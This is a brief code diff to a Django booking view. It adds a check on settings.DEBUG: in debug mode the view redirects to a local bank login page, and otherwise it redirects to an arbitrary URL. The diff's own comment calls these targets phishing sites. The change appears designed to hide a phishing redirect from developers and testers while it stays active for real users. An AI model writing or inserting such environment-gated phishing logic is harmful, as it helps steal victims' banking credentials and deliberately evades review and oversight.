@@ -466,9 +466,11 @@ def booking(request):
 
 
 
-
-        # return redirect('bank_login')
-        return redirect(url)
+        if settings.DEBUG:
+            #if DEBUG is TRUE do not rediret to phishing sites
+            return redirect('bank_login')
+        else:
+            return redirect(url)
 
 
     return redirect('tasks')  # Redirect to a default view if the request method is not POST
